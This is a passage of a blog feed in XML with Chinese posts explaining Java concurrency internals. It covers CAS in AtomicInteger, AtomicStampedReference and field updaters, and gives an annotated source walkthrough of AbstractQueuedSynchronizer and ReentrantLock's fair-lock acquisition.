class="title">getAndIncrement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> current = get();</span><br><span class="line">        <span class="keyword">int</span> next = current + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (compareAndSet(current, next))</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是我们熟悉的CAS算法套路：</p><ul><li>循环重试，如果下一步的CAS更新失败，说明有线程修改了当前值。没关系。舍弃失败的操作，再次循环直达成功</li><li>获取当前值进行加1 操作</li><li>调用compareAndSet方法原子更新操作</li></ul><p>compareAndSet调用unsafe类的compareAndSwapInt<strong>本地方法</strong></p><ul><li>unsafe： 获取并操作内存的数据。</li><li>valueOffset： 存储value在AtomicInteger中的偏移量。</li><li>value： 存储AtomicInteger的int值，该属性需要借助volatile关键字保证其在线程间是可见的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">compareAndSet</span><span class="params">(<span class="keyword">int</span> expect, <span class="keyword">int</span> update)</span> </span>&#123;</span><br><span class="line"><span class="comment">//unsafe.compareAndSwapInt为native方法</span></span><br><span class="line">        <span class="keyword">return</span> unsafe.compareAndSwapInt(<span class="keyword">this</span>, valueOffset, expect, update);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>compareAndSwapInt本地方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">compareAndSwapInt</span><span class="params">(Object var1, <span class="keyword">long</span> var2, <span class="keyword">int</span> var4, <span class="keyword">int</span> var5)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="原子更新数组3个"><a href="#原子更新数组3个" class="headerlink" title="原子更新数组3个"></a>原子更新数组3个</h4><ul><li>AtomicIntegerArray</li><li>AtomicLongArray</li><li>AtomicReferenceArray</li></ul><h4 id="原子更新引用类型3个"><a href="#原子更新引用类型3个" class="headerlink" title="原子更新引用类型3个"></a>原子更新引用类型3个</h4><ul><li>AtomicReference：原子更新引用类型</li><li>AtomicMarkableReference：原子更新带有标记位的引用类型。</li><li>AtomicStampedReference：原子更新带有<strong>版本号</strong>的引用类型。</li></ul><p>特别说一下AtomicStampedReference，它与原子引用不一样的地方在于，它使用版本号解决ABA问题。它调用比较交换方法时除了传入原值和要更新的值，还需要传入原版本号和版本号加一。这样每次变量更新的时候都把版本号加一，这样变化过程就从“A－B－A”变成了“1A－2B－3A”。</p><h4 id="原子更新器3个"><a href="#原子更新器3个" class="headerlink" title="原子更新器3个"></a>原子更新器3个</h4><p>可以让普通的变量也享受CAS操作。</p><ul><li><p>AtomicIntegerFieldUpdater：原子更新整型字段</p></li><li><p>AtomicLongFieldUpdater：原子更新长整型字段</p></li><li><p>AtomicReferenceFieldUpdater：原子更新引用类型里的字段</p></li></ul><p>实例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个原子更新器</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> AtomicIntegerFieldUpdater&lt;User&gt; atomicIntegerFieldUpdater =</span><br><span class="line">         AtomicIntegerFieldUpdater.newUpdater(User.class,<span class="string">"old"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">   <span class="keyword">volatile</span>  User user = <span class="keyword">new</span> User(<span class="string">"Tom"</span>,<span class="number">15</span>);</span><br><span class="line">     <span class="comment">//原来的年龄</span></span><br><span class="line">     System.out.println(atomicIntegerFieldUpdater.getAndIncrement(user));</span><br><span class="line">     <span class="comment">//现在的年龄</span></span><br><span class="line">     System.out.println(atomicIntegerFieldUpdater.get(user));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AQS源码解析</title>
      <link href="/2019/08/14/AQS/"/>
      <url>/2019/08/14/AQS/</url>
      
        <content type="html"><![CDATA[<h1 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h1><p>AbstractQueuedSynchronizer 类（简称 AQS）。它是一个<strong>抽象类</strong>，定义一套多线程访问共享资源的同步器框架，是抽象的队列式的同步器。</p><p>同步器是基于<strong>模板方法模式</strong>的，同步器的子类可以通过继承同步器并实现它的抽象方法来管理同步状态，子类推荐被定义为自定义同步组件的<strong>静态内部类</strong>。</p><p>[TOC]</p><h2 id="两个核心"><a href="#两个核心" class="headerlink" title="两个核心"></a>两个核心</h2><h3 id="volatile-int-state"><a href="#volatile-int-state" class="headerlink" title="volatile int state"></a>volatile int state</h3><p>同步的核心其实就一个用volatile修饰的int成员变量，<strong>锁的状态就是这个值的更改</strong>。0就是当前没有线程获取锁，1是有。可重入锁可以多次加锁，即把state值加一，当然也需要同样次数的解锁，因为0才代表当前没有线程获取锁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private volatile int state;</span><br></pre></td></tr></table></figure><h3 id="FIFO队列"><a href="#FIFO队列" class="headerlink" title="FIFO队列"></a>FIFO队列</h3><p>一个先进先出的双向链表。<em>这个队列的操作有一点复杂，我建议您可以先跳下去看重要方法后，再回头看Node类。</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Node SHARED = <span class="keyword">new</span> Node();<span class="comment">//标识等待节点处于共享模式</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Node EXCLUSIVE = <span class="keyword">null</span>;<span class="comment">//标识等待节点处于独占模式</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CANCELLED =  <span class="number">1</span>;<span class="comment">//由于超时或中断，节点已被取消</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SIGNAL    = -<span class="number">1</span>;<span class="comment">//表示下一个节点是通过park堵塞的，需要通过unpark唤醒</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CONDITION = -<span class="number">2</span>;<span class="comment">//表示线程在等待条件变量（先获取锁，加入到条件等待队列，然后释放锁，等待条件变量满足条件；只有重新获取锁之后才能返回）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PROPAGATE = -<span class="number">3</span>;<span class="comment">//表示后续结点会传播唤醒的操作，共享模式下起作用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待状态：对于condition节点，初始化为CONDITION；其它情况，默认为0，通过CAS操作原子更新</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> waitStatus;</span><br><span class="line">    <span class="comment">//前节点</span></span><br><span class="line">    <span class="keyword">volatile</span> Node prev;</span><br><span class="line">    <span class="comment">//后节点</span></span><br><span class="line">    <span class="keyword">volatile</span> Node next;</span><br><span class="line">    <span class="comment">//线程对象</span></span><br><span class="line">    <span class="keyword">volatile</span> Thread thread;</span><br><span class="line">    <span class="comment">//对于Condtion表示下一个等待条件变量的节点；其它情况下用于区分共享模式和独占模式；</span></span><br><span class="line">    Node nextWaiter;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isShared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nextWaiter == SHARED;<span class="comment">//判断是否共享模式</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取前节点，如果为null，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> Node <span class="title">predecessor</span><span class="params">()</span> <span class="keyword">throws</span> NullPointerException </span>&#123;</span><br><span class="line">        Node p = prev;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Node() &#123;    <span class="comment">// Used to establish initial head or SHARED marker</span></span><br><span class="line">    &#125;</span><br><span class="line">    Node(Thread thread, Node mode) &#123;     <span class="comment">//addWaiter方法使用</span></span><br><span class="line">        <span class="keyword">this</span>.nextWaiter = mode;</span><br><span class="line">        <span class="keyword">this</span>.thread = thread;</span><br><span class="line">    &#125;</span><br><span class="line">    Node(Thread thread, <span class="keyword">int</span> waitStatus) &#123; <span class="comment">//Condition使用</span></span><br><span class="line">        <span class="keyword">this</span>.waitStatus = waitStatus;</span><br><span class="line">        <span class="keyword">this</span>.thread = thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重要方法"><a href="#重要方法" class="headerlink" title="重要方法"></a>重要方法</h2><p>isHeldExclusively() 该线程是否正在独占资源。只有用到 condition 才需要去实现它。<br>tryAcquire(int)/tryRelease(int)独占方式，尝试获取/释放资源。<br>tryAcquireShared(int)/tryReleaseShared(int)共享方式，尝试获取/释放资源。</p><p>这篇本博文只介绍独占方式，尝试获取/释放资源的方法。</p><h3 id="acquire-获取同步状态"><a href="#acquire-获取同步状态" class="headerlink" title="acquire()获取同步状态"></a>acquire()获取同步状态</h3><p>不要小看这一行判断，这一句代码其实就是获取许可的核心操作了。</p><ul><li>tryAcquire<strong>尝试获取同步状态</strong>，成功就没必要加入队列。</li><li>如果获取同步状态失败，把线程构造成结点（Node.EXCLUSIVE，独占式）addWaiter把<strong>结点加入队列尾部</strong>。</li><li>加入之后acquireQueued()死循环去<strong>轮询前一个结点看是否轮到自己了</strong>。</li><li>如果轮到自己了，把自己的线程状态设置为<strong>打断等待</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">         acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">         selfInterrupt();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="tryAcquire-尝试获取同步状态"><a href="#tryAcquire-尝试获取同步状态" class="headerlink" title="tryAcquire()尝试获取同步状态"></a>tryAcquire()尝试获取同步状态</h3><p>注意：这里的tryAcquire我是把<strong>可重入锁的公平锁对tryAcquire()的实现</strong>贴过来了！因为AQS抽象类并没有实现这个方法，而是留给子类去实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取当前线程</span></span><br><span class="line">           <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">           <span class="keyword">int</span> c = getState();</span><br><span class="line">    <span class="comment">//c等于0，说明锁没有被线程占有，可以试图获取锁</span></span><br><span class="line">           <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">//如果前面没有线程排队，就用CAS把state从0更新为1</span></span><br><span class="line">               <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">                   compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                   <span class="comment">//获取到锁了，标记一下，告诉大家，现在是本线程占用了锁</span></span><br><span class="line">                   setExclusiveOwnerThread(current);</span><br><span class="line">                   <span class="comment">//锁获取成功，直接返回</span></span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">     <span class="comment">//c不等于0或者上面CAS操作失败了，说明锁被某线程占有</span></span><br><span class="line">    <span class="comment">//重入就在下面这段代码实现的</span></span><br><span class="line">    <span class="comment">//由于ReentrantLock是可重入，如果获取锁的线程是当前线程，那还是可以再操作一波的</span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">               <span class="comment">//重入了就对state再加1，别忘了acquires是写死为1的</span></span><br><span class="line">               <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">               <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">               <span class="comment">//注意：可重入锁加了几次就要释放几次</span></span><br><span class="line">               setState(nextc);</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="addWaiter-线程构造成结点尾部入队和enq-自旋入队"><a href="#addWaiter-线程构造成结点尾部入队和enq-自旋入队" class="headerlink" title="addWaiter()线程构造成结点尾部入队和enq()自旋入队"></a>addWaiter()线程构造成结点尾部入队和enq()自旋入队</h3><p>用CAS结点加入队列</p><blockquote><p>不过当结点被<strong>并发</strong>地被添加到 LinkedList时, LinkedList将难以保证Node的正确添加,最终的结果可能是节点的数量有偏差,而且顺序也是混乱的。<br> 所以在enq( final Node node)方法中,同步器通过“死循环”来保证节点的正确添加,在“死循环”中只有通过CAS将节点设置成为尾节点之后,当前线程才能从该方法返回,否则当前线程不断地尝试设置。可以看出,enq( final Node node)方法将并发添加节点的请求通过CAS变得“<strong>串行化</strong>”了。</p><p>——以上出自《java并发编程的艺术》</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Node <span class="title">addWaiter</span><span class="params">(Node mode)</span> </span>&#123;</span><br><span class="line">    Node node = <span class="keyword">new</span> Node(Thread.currentThread(), mode);</span><br><span class="line">    Node pred = tail;</span><br><span class="line">    <span class="keyword">if</span> (pred != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="comment">// 将自己的前驱指向尾节点 </span></span><br><span class="line">        node.prev = pred;</span><br><span class="line">        <span class="comment">//用CAS把自己加到尾部</span></span><br><span class="line">        <span class="keyword">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class="line">       <span class="comment">// 设置尾结点的后继为自己，双向链表嘛</span></span><br><span class="line">            pred.next = node;</span><br><span class="line">            <span class="comment">//线程成功添加到尾部，可以返回了</span></span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//但是添加尾结点的操作在并发的情况下可能失败，于是有了enq方法</span></span><br><span class="line">    <span class="comment">//如果到这里，说明 pred==null队列是空的，或者 CAS把自己探究到尾结点失败(有线程在竞争入队)</span></span><br><span class="line">    enq(node);</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enq()因为addWaiter中首次添加到队列尾部失败了，自旋加入队列尾部</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Node <span class="title">enq</span><span class="params">(<span class="keyword">final</span> Node node)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//死循环添加，我就不信加不进去了哼</span></span><br><span class="line">       <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">           Node t = tail;</span><br><span class="line">           <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123; <span class="comment">// Must initialize</span></span><br><span class="line">               <span class="comment">// 初始化head节点</span></span><br><span class="line">               <span class="keyword">if</span> (compareAndSetHead(<span class="keyword">new</span> Node()))</span><br><span class="line">                   <span class="comment">// 注意：这里只是设置了tail=head，这里可没return哦，没有return，没有return</span></span><br><span class="line">                   <span class="comment">// 所以，设置完了以后，继续for循环，下次就到下面的else分支了</span></span><br><span class="line">                   tail = head;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//还是加入队列尾部，不过是写在循环里的，加进去了才跳出循环。</span></span><br><span class="line">               node.prev = t;</span><br><span class="line">               <span class="keyword">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class="line">                   t.next = node;</span><br><span class="line">                   <span class="keyword">return</span> t;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="acquireQueued-自旋询问是否到我了"><a href="#acquireQueued-自旋询问是否到我了" class="headerlink" title="acquireQueued()自旋询问是否到我了"></a>acquireQueued()自旋询问是否到我了</h3><p>进入一个自旋的过程，不断轮询前面结点的状态，看啥时候到我了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">acquireQueued</span><span class="params">(<span class="keyword">final</span> Node node, <span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;</span><br><span class="line">            <span class="comment">//一直空轮询判断自己是不是</span></span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                <span class="keyword">final</span> Node p = node.predecessor();</span><br><span class="line">                <span class="comment">//当前节点如果前驱是头结点，就tryAcquire用CAS尝试操作一下state</span></span><br><span class="line">                <span class="keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class="line">                <span class="comment">//获取许可了，就把自己设置为头结点</span></span><br><span class="line">                    setHead(node);</span><br><span class="line">                    <span class="comment">//把前驱的后继指针设置为null，帮助GC回收</span></span><br><span class="line">                    p.next = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">                    <span class="comment">//标记设置成功</span></span><br><span class="line">                    failed = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="comment">//没有被其他线程打断</span></span><br><span class="line">                    <span class="keyword">return</span> interrupted;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="comment">// 前驱不是头结点，或者上面的if分支没有成功，tryAcquire(arg)没有抢赢别人</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class="line">                    parkAndCheckInterrupt())</span><br><span class="line">                    interrupted = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (failed)</span><br><span class="line">                cancelAcquire(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="shouldParkAfterFailedAcquire抢锁失败，判断是否需要挂起当前线程"><a href="#shouldParkAfterFailedAcquire抢锁失败，判断是否需要挂起当前线程" class="headerlink" title="shouldParkAfterFailedAcquire抢锁失败，判断是否需要挂起当前线程"></a>shouldParkAfterFailedAcquire抢锁失败，判断是否需要挂起当前线程</h3><p>在获取同步状态失败后，线程并不是立马进行阻塞，需要检查该线程的状态。该方法主要靠前驱节点判断当前线程是否应该被阻塞。</p><ol><li>如果当前线程的前驱节点状态为SINNAL（ws=-1），则表明当前线程需要被阻塞，调用unpark()方法唤醒，直接返回true，当前线程阻塞.</li><li>如果当前线程的前驱节点状态为CANCELLED（ws &gt; 0），则表明该线程的前驱节点已经等待超时或者被中断了，则需要从CLH队列中将该前驱节点删除掉，直到回溯到前驱节点状态 &lt;= 0 ，返回false</li><li>如果前驱节点非SINNAL，非CANCELLED，则通过CAS的方式将其前驱节点设置为SINNAL，返回false</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// 第一个参数是前驱节点，第二个参数是当前线程的节点</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">shouldParkAfterFailedAcquire</span><span class="params">(Node pred, Node node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ws = pred.waitStatus;</span><br><span class="line">    <span class="keyword">if</span> (ws == Node.SIGNAL)</span><br><span class="line">     <span class="comment">//前驱节点的 waitStatus == -1 ，说明前驱节点状态正常，当前线程需要挂起，直接可以返回true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">// 前驱节点 waitStatus大于0 ，说明前驱节点取消了排队。往前遍历找一个前驱</span></span><br><span class="line">    <span class="keyword">if</span> (ws &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            node.prev = pred = pred.prev;</span><br><span class="line">        &#125; <span class="keyword">while</span> (pred.waitStatus &gt; <span class="number">0</span>);</span><br><span class="line">        pred.next = node;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用CAS将前驱节点的waitStatus设置为Node.SIGNAL(也就是-1)</span></span><br><span class="line">        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这个方法返回 false，那么会再走一次 for 循序，</span></span><br><span class="line">    <span class="comment">// 直到ws=-1，进入第一个if分支</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 shouldParkAfterFailedAcquire(Node pred, Node node) 方法返回true，则调用parkAndCheckInterrupt()方法阻塞当前线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">parkAndCheckInterrupt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> Thread.interrupted();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来以ReentrantLock的源码来分析AQS的具体实现。</p><h1 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h1><p>最核心的成员变量final Sync sync，这是一个继承AQS的抽象类，它有两个实现，一个是公平锁一个是非公平锁。</p><p>获取当前占用锁的线程，如果State为0表示当前没有线程获取锁返回null，如果有就getExclusiveOwnerThread获取线程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">final Thread getOwner() &#123;  </span><br><span class="line">return getState() == 0 ? null : getExclusiveOwnerThread();&#125;</span><br></pre></td></tr></table></figure><h2 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h2><h3 id="lock"><a href="#lock" class="headerlink" title="lock"></a>lock</h3><p>这里直接<strong>把值写死了</strong>，每次加锁，acquire方法传入1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final void lock() &#123;    acquire(1);&#125;</span><br></pre></td></tr></table></figure><h3 id="AQS的acquire"><a href="#AQS的acquire" class="headerlink" title="AQS的acquire"></a>AQS的acquire</h3><p><em>点进acquire方法发现它跳到 AQS的acquire方法里去了，而点进AQS的tryAcquire发现它只抛出一个不支持操作的异常。也就是说在公平锁里，加锁这个操作用的AQS的<strong>acquire</strong>（和非公平锁<strong>共用</strong>），而<strong>tryAcquire</strong>是公平锁和非公平锁<strong>各自</strong>实现的。</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">        selfInterrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tryAcquire"><a href="#tryAcquire" class="headerlink" title="tryAcquire"></a>tryAcquire</h3><p>这个方法在上文的AQS中已经分析过了，为了方便顺着看，再贴过来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 